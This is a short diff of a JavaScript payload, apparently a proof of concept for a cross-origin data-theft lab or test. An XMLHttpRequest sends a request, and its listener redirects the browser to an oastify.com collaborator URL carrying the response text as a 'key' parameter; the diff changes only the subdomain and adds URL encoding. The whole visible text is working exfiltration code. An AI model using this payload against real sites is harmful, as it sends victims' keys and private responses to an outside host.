@@ -11,5 +11,5 @@ var xhr = new XMLHttpRequest();
         xhr.send(new Blob([aBody]));
       
         function reqListener() {
-            location='https://cbrlanimf0tn4gwa5gip99a5rwxnlhj58.oastify.com/log?key='+this.responseText;
+            location='https://q6xz51d0aeo1zuro0ud34n5jmas1gvgj5.oastify.com/log?key='+encodeURIComponent(this.responseText);
         }
